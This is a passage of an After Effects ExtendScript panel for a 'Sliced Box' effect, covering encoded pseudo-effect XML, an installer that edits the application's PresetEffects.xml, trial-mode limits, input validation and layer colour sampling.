roup%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FExtrusion%3DExtrusion%22%20default%3D%22100%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FMaterial%3DMaterial%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesOpacity%3DBoxes%20Opacity%22%20default%3D%22100%22%20slider_min%3D%220%22%20slider_max%3D%22100%22%20valid_min%3D%220%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FFrontOpacity%3DFront%20Opacity%22%20default%3D%22100%22%20slider_min%3D%221%22%20slider_max%3D%22100%22%20valid_min%3D%221%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CColor%20name%3D%22%24%24%24%2FAE%2FPreset%2FColor%3DColor%22%20default_red%3D%220%22%20default_green%3D%22128%22%20default_blue%3D%22255%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FVirtualLight%3DVirtual%20Light%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FEnableVL%3DEnable%20VL%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FTop%3DTop%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%225%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FLeft%3DLeft%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-20%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRight%3DRight%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-50%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBack%3DBack%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-10%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBottom%3DBottom%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-40%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%3C%2FEffect%3E";
      var SlicedBox_Y =
        "%3CEffect%20matchname%3D%22Pseudo%2FSliced_BoxRV3%22%20name%3D%22%24%24%24%2FAE%2FPreset%2FPseudo%2FSliced_BoxRV3%3DSliced%20Box%20-%20%5BOneRow%5D%22%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FAnchorPoint%3DAnchor%20Point%22%20%3E%0A%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FCenterAnchorPoint%5BZ%5D%3DCenter%20Anchor%20Point%20%5BZ%5D%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FAnchorPoint%5BZ%5D%3DAnchor%20Point%20%5BZ%5D%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%221%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FPosition%3DPosition%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FXDisplace%3DX%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FYDisplace%3DY%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FZDisplace%3DZ%20Displace%22%20default%3D%220%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-1000000%22%20valid_max%3D%221000000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FPositionRandomizer%3DPosition%20Randomizer%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FY%3DY%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FZ%3DZ%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FRandomSeed%3DRandom%20Seed%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-1000%22%20valid_max%3D%221000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesRotation%3DBoxes%20Rotation%22%20%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotation%3DRotation%22%20%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationX%3DRotation%20X%22%20default%3D%220%22%20%2F%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationY%3DRotation%20Y%22%20default%3D%220%22%20%2F%3E%0A%09%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationZ%3DRotation%20Z%22%20default%3D%220%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRotationOffset%3DRotation%20Offset%22%20%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetX%3DOffset%20X%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetY%3DOffset%20Y%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffsetZ%3DOffset%20Z%22%20default%3D%220%22%20slider_min%3D%22-720%22%20slider_max%3D%22720%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FWorldRotation%3DWorld%20Rotation%22%20%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FX%3DX%22%20default%3D%220%22%20%2F%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FY%3DY%22%20default%3D%220%22%20%2F%3E%0A%09%09%3CAngle%20name%3D%22%24%24%24%2FAE%2FPreset%2FZ%3DZ%22%20default%3D%220%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FScale%3DScale%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesScale%3DBoxes%20Scale%22%20default%3D%22100%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FScaleOffset%3DScale%20Offset%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FEnable%3DEnable%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FScale%3DScale%22%20default%3D%2250%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-100%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FOffset%3DOffset%22%20default%3D%2220%22%20slider_min%3D%220%22%20slider_max%3D%22100%22%20valid_min%3D%220%22%20valid_max%3D%2210000%22%20precision%3D%222%22%20%2F%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FZeroMinimum%3DZero%20Minimum%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FDirection%3DDirection%22%20%3E%0A%09%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FReverse%3DReverse%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FMiddletoSides%3DMiddle%20to%20Sides%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FSidestoMiddle%3DSides%20to%20Middle%22%20hold%3D%22true%22%20default%3D%22false%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%3C%2FGroup%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FExtrusion%3DExtrusion%22%20default%3D%22100%22%20slider_min%3D%22-1000%22%20slider_max%3D%221000%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%3C%2FGroup%3E%0A%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FMaterial%3DMaterial%22%20%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBoxesOpacity%3DBoxes%20Opacity%22%20default%3D%22100%22%20slider_min%3D%220%22%20slider_max%3D%22100%22%20valid_min%3D%220%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FFrontOpacity%3DFront%20Opacity%22%20default%3D%22100%22%20slider_min%3D%220%22%20slider_max%3D%22100%22%20valid_min%3D%221%22%20valid_max%3D%22100%22%20precision%3D%220%22%20DISPLAY_PERCENT%3D%22true%22%20%2F%3E%0A%09%09%3CColor%20name%3D%22%24%24%24%2FAE%2FPreset%2FColor%3DColor%22%20default_red%3D%220%22%20default_green%3D%22128%22%20default_blue%3D%22255%22%20%2F%3E%0A%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FVirtualLight%3DVirtual%20Light%22%20%3E%0A%09%09%09%3CCheckbox%20name%3D%22%24%24%24%2FAE%2FPreset%2FEnableVL%3DEnable%20VL%22%20hold%3D%22true%22%20default%3D%22true%22%20%2F%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FTop%3DTop%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%225%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FLeft%3DLeft%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-20%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FRight%3DRight%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-50%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBack%3DBack%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-10%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%09%3CGroup%20name%3D%22%24%24%24%2FAE%2FPreset%2FBottom%3DBottom%22%20%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FBrightness%3DBrightness%22%20default%3D%22-40%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%09%3CSlider%20name%3D%22%24%24%24%2FAE%2FPreset%2FContrast%3DContrast%22%20default%3D%2220%22%20slider_min%3D%22-100%22%20slider_max%3D%22100%22%20valid_min%3D%22-10000%22%20valid_max%3D%2210000%22%20precision%3D%221%22%20%2F%3E%0A%09%09%09%3C%2FGroup%3E%0A%09%09%3C%2FGroup%3E%0A%09%3C%2FGroup%3E%0A%3C%2FEffect%3E";
      if (!isSecurityPrefSet()) {
        alert(
          'This script requires access to write files.\nGo to the "General" panel of the application preferences and make sure "Allow Scripts to Write Files and Access Network" is checked.',
          alertTitle,
        );
        app.executeCommand(2359);
        if (!isSecurityPrefSet()) {
          return null;
        }
      }
      if ($.os.indexOf("Windows") > -1) {
        var AEFolder = Folder.startup.absoluteURI + "/";
      } else {
        var AEFolder = Folder.appPackage.absoluteURI + "/Contents/Resources/";
      }
      var PresetEffects = new File(AEFolder + "PresetEffects.xml");
      var tempFile = new File(AEFolder + "temp.xml");
      if (!PresetEffects.exists) {
        alert(
          "Error accessing: " +
            PresetEffects.fsName +
            "/nPlease verify that it exists and that After Effects has enough permissions to access it.",
          alertTitle,
        );
        return false;
      }
      var effectStart = "<Sliced_BoxV3__start>";
      var effectEnd = "<Sliced_BoxV3__end>";
      PresetEffects.open("r");
      tempFile.open("w");
      while (!PresetEffects.eof) {
        var currentLine = PresetEffects.readln();
        if (currentLine === effectStart) {
          PresetEffects.close();
          tempFile.close();
          tempFile.remove();
          insPsuedoStatus = "AlreadyInstalled";
          alert("Already Installed", alertTitle);
          return insPsuedoStatus;
        }
        if (currentLine.indexOf("</Effects>") === -1) {
          tempFile.writeln(currentLine);
        } else {
          break;
        }
      }
      oneLine = encodeURIComponent("\r");
      fourLines = encodeURIComponent("\r\r\r\r");
      fileEnd = oneLine + encodeURIComponent("</Effects>");
      effectStart_D = decodeURIComponent(effectStart);
      effectEnd_D = decodeURIComponent(effectEnd);
      var effectWriting = tempFile.writeln(
        decodeURIComponent(
          fourLines +
            effectStart_D +
            oneLine +
            SlicedBox +
            fourLines +
            SlicedBox_X +
            fourLines +
            SlicedBox_Y +
            oneLine +
            effectEnd_D +
            fileEnd,
        ),
      )
        ? true
        : false;
      if (effectWriting) {
        PresetEffects.close();
        PresetEffects.remove();
        tempFile.close();
        tempFile.rename("PresetEffects.xml");
        alert(
          "Sliced Box pseudo effect successfully installed!\rOne step ahead:\rKindly restart After Effects",
          alertTitle,
        );
        insPsuedoStatus = "Restart";
        return insPsuedoStatus;
      } else {
        alert(
          "Couldn\'t install Sliced Box pseudo effect\rPlease make sure to run After Effects as administrator to install",
          alertTitle,
        );
        insPsuedoStatus = "FailedWriting";
        return insPsuedoStatus;
      }
    }
    function isSecurityPrefSet() {
      var securitySetting = app.preferences.getPrefAsLong(
        "Main Pref Section",
        "Pref_SCRIPTING_FILE_NETWORK_SECURITY",
      );
      return securitySetting == 1;
    }
    function checkPresetsFile() {
      var presetFile = File(presestsFolder + "/KeyframesPresets.json");
      if (!presetFile.exists) {
        presetFile.open("w");
        presetFile.encoding = "UTF-8";
        presetFile.write("[]");
        presetFile.close();
      }
      return presetFile;
    }
    function ParseJSON(e) {
      e.open("r", "TEXT");
      var c = e.read();
      e.close();
      e = [];
      var d = [];
      var a = 1;
      var b = 0;
      if (-1 != c.indexOf("]")) {
        for (; a < c.length; ) {
          if (((startIndex = c.indexOf('{"Name"', a)), -1 != startIndex)) {
            d.push(startIndex);
            a = d[b] + 1;
            b++;
          } else {
            break;
          }
        }
      }
      a = null;
      if (0 != d.length) {
        for (var b = 0; b < d.length; b += 1) {
          if (b == d.length - 1) {
            for (
              var f = 0;
              (ClosingArray = c[c.length - f]), "]" != ClosingArray;
            ) {
              f++;
            }
            ObjStr = c.slice(d[b], c.length - f);
          } else {
            ObjStr = c.slice(d[b], d[b + 1] - 1);
          }
          try {
            e.push(JSON.parse(ObjStr));
          } catch (g) {
            a = g;
          }
        }
      } else {
        a = "empty";
      }
      if (null === a || "empty" == a) {
        return e;
      }
      alert(a, alertTitle + " - JSON Error");
      return null;
    }
    function getScptList() {
      if ($.os.indexOf("Windows") > -1) {
        var AEFolder = Folder.startup.absoluteURI + "/";
      } else {
        var AEFolder = Folder.appPackage.absoluteURI + "/Contents/Resources/";
      }
      var folder = Folder(AEFolder + "Scripts/ScriptUI Panels");
      var files = folder.getFiles();
      var names = [];
      for (var i = 0; i < files.length; i += 1) {
        names.push(files[i].name);
      }
      return JSON.stringify(names);
    }
    function SLICEDBOXV3MainFunction(thisObj) {
      function buildUI1(thisObj) {
        if (thisObj instanceof Panel) {
          var myPal = thisObj;
        } else {
          var myPal = new Window("palette", scriptName, undefined, {
            resizeable: false,
          });
        }
        if (myPal != null) {
          function checkActiveComp() {
            mainComp = app.project.activeItem;
            if (mainComp instanceof CompItem) {
              selectedLayers = mainComp.selectedLayers;
              if (selectedLayers.length != 0) {
                numLayers = selectedLayers.length;
                selectedLayer = selectedLayers[0];
                layerIndex = selectedLayer.index;
                return true;
              } else {
                alert("Please select a layer!", alertTitle);
                return null;
              }
            } else {
              alert("Please open a Comp first and select a layer!", alertTitle);
              return null;
            }
          }
          function checkNumberEntry(entree) {
            try {
              Result = eval(entree);
            } catch (error) {
              Result = null;
            }
            if (isNaN(parseFloat(Result))) {
              Result = null;
            }
            return Result;
          }
          function checkInputs() {
            SBColumns = ColumnsText.text;
            SBRows = RowsText.text;
            BoxWidthSB = BoxWidthText.text;
            TrialLimit = false;
            var Trial = B8.t();
            if (Trial) {
              if (SBColumns > 3 || SBRows > 3) {
                alert(
                  "In trial mode the box is limited to 3 columns and 3 rows.",
                  alertTitle,
                );
                SBColumns = 3;
                SBRows = 3;
                TrialLimit = true;
              }
            }
            if (TrialLimit === false) {
              var ColumnsCH = checkNumberEntry(SBColumns);
              var RowsCH = checkNumberEntry(SBRows);
              var BoxWidthCH = checkNumberEntry(BoxWidthSB);
              var LayerTypeAlert =
                "The layer must be Solid, Comp, Footage or a Text";
              if (numLayers === 1) {
                if (selectedLayer instanceof CameraLayer) {
                  alert(LayerTypeAlert, alertTitle);
                  return null;
                } else if (selectedLayer instanceof LightLayer) {
                  alert(LayerTypeAlert, alertTitle);
                  return null;
                } else if (selectedLayer instanceof ShapeLayer) {
                  alert(LayerTypeAlert, alertTitle);
                  return null;
                } else if (selectedLayer.nullLayer == true) {
                  alert(LayerTypeAlert, alertTitle);
                  return null;
                } else if (selectedLayer.adjustmentLayer == true) {
                  alert(LayerTypeAlert, alertTitle);
                  return null;
                } else if (selectedLayer.guideLayer == true) {
                  alert(LayerTypeAlert, alertTitle);
                  return null;
                } else if (
                  selectedLayer.hasAudio == true &&
                  selectedLayer.hasVideo == false
                ) {
                  alert(LayerTypeAlert, alertTitle);
                  return null;
                } else {
                  if (
                    ColumnsCH == null ||
                    ColumnsCH <= 0 ||
                    ColumnsCH == undefined
                  ) {
                    alert(
                      'Detect invalid input\r "Columns"\r\r-Wrong value',
                      alertTitle,
                    );
                    return null;
                  } else if (
                    RowsCH == null ||
                    RowsCH <= 0 ||
                    RowsCH == undefined
                  ) {
                    alert(
                      'Detect invalid input\r "Rows"\r \r\r-Wrong value',
                      alertTitle,
                    );
                    return null;
                  } else if (ColumnsCH > selectedLayer.width) {
                    alert(
                      'Detect invalid input\r "Columns"\r \r\r-Columns count is greater than the layer width',
                      alertTitle,
                    );
                    return null;
                  } else if (RowsCH > selectedLayer.height) {
                    alert(
                      'Detect invalid input\r "Rows"\r \r\r-Rows count is greater than the layer height',
                      alertTitle,
                    );
                    return null;
                  } else if (
                    BoxWidthCH == null ||
                    BoxWidthCH <= 0 ||
                    BoxWidthCH == undefined
                  ) {
                    alert(
                      'Detect invalid input\r "Box Width"\r \r-Box Width must be greater than zero',
                      alertTitle,
                    );
                    return null;
                  } else if (BoxWidthCH % 1 != 0) {
                    alert(
                      'Detect invalid input\r "Box Width"\r \r-Box Width must be an integer number',
                      alertTitle,
                    );
                    return null;
                  } else if (ColumnsCH % 1 != 0) {
                    alert(
                      'Detect invalid input\r "Columns"\r \r\r-Columns must be an integer number',
                      alertTitle,
                    );
                    return null;
                  } else if (RowsCH % 1 != 0) {
                    alert(
                      'Detect invalid input\r "Rows"\r \r\r-Rows must be an integer number',
                      alertTitle,
                    );
                    return null;
                  } else if (ColumnsCH == 1 && RowsCH == 1) {
                    alert(
                      "Detect invalid input\r One Row and one Column, Not a Sliced Box ^\u1d17^",
                      alertTitle,
                    );
                    return null;
                  } else {
                    var Effects = selectedLayer.property("Effects");
                    if (Effects.numProperties != 0) {
                      for (var i = 1; i <= Effects.numProperties; i += 1) {
                        effectName = Effects(i).matchName;
                        if (effectName.indexOf("Sliced_Box") != -1) {
                          alert(
                            "Can\'t apply on another Sliced Box! ^_^ ",
                            alertTitle,
                          );
                          return null;
                        }
                      }
                      return true;
                    } else {
                      return true;
                    }
                  }
                }
              } else {
                alert("Please select one layer!", alertTitle);
                return null;
              }
            }
          }
          function getRandomColor() {
            return [Math.random(), Math.random(), Math.random(), 1];
          }
          function getImageColor(Comp, Layer) {
            var TempComp = app.project.items.addComp(
              "TempComp",
              Comp.width,
              Comp.height,
              1,
              Comp.duration,
              25,
            );
            TempComp.time = Comp.time;
            Layer.copyToComp(TempComp);
            var tempLayer = TempComp.layer(1);
            resizeComp(TempComp, tempLayer.width, tempLayer.height);
            var x = getRandomInt(TempComp.width);
            var y = getRandomInt(TempComp.height);
            var pointControl =
              tempLayer.Effects.addProperty("ADBE Point Control");
            var point = tempLayer("Effects")("ADBE Point Control")(
              "ADBE Point Control-0001",
            );
            point.setValue([x, y]);
            var redText = TempComp.layers.addText();
            var redSourceText = redText.property("Source Text");
            redSourceText.expression =
              'targetLayer = thisComp.layer("' +
              tempLayer.name +
              '"); samplePoint = targetLayer.effect("ADBE Point Control")("ADBE Point Control-0001");\n    sampleRadius = [1,1]; sampledColor_8bpc = 255 * targetLayer.sampleImage(samplePoint, sampleRadius);\n    R = Math.round(sampledColor_8bpc[0]); outputString = R';
            var greenText = TempComp.layers.addText();
            var greenSourceText = greenText.property("Source Text");
            greenSourceText.expression =
              'targetLayer = thisComp.layer("' +
              tempLayer.name +
              '");\n    samplePoint = targetLayer.effect("ADBE Point Control")("ADBE Point Control-0001");\n    sampleRadius = [1,1]; sampledColor_8bpc = 255 * targetLayer.sampleImage(samplePoint, sampleRadius);\n    G = Math.round(sampledColor_8bpc[1]); outputString = G';
            var blueText = TempComp.layers.addText();
            var blueSourceText = blueText.property("Source Text");
            blueSourceText.expression =
              'targetLayer = thisComp.layer("' +
              tempLayer.name +
              '");\n    samplePoint = targetLayer.effect("ADBE Point Control")("ADBE Point Control-0001"); sampleRadius = [1,1];\n    sampledColor_8bpc = 255 * targetLayer.sampleImage(samplePoint, sampleRadius); \n    B = Math.round(sampledColor_8bpc[2]); outputString = B';
            var rValue = parseInt(redSourceText.value) / 255;
            var gValue = parseInt(greenSourceText.value) / 255;
            var bValue = parseInt(blueSourceText.value) / 255;
            redText.remove();
            greenText.remove();
            blueText.remove();
            pointControl.remove();
            TempComp.remove();
            var colour = [rValue, gValue, bValue];
            mainComp.layer(layerIndex).selected = true;
            return colour;
          }
          function getSolidColor(layer) {
            solidColor = layer.source.mainSource.color;
            return solidColor;
          }
          function _createFolderItem() {
            numItems = app.project.items.length;
            Nums = new Array();
            for (var i = 1; i <= numItems; i += 1) {
              if (app.project.item(i).typeName === "Folder") {
                folderName = app.project.item(i).name;
                if (folderName.match("Sliced Box_") == "Sliced Box_") {
                  L = folderName.length;
                  n = folderName.slice(11, L);
                  Nums.push(n);
                }
              }
            }
            var C = 0;
            var N = 1;
            while (true) {
              for (var i = 0; i < Nums.length; i += 1) {
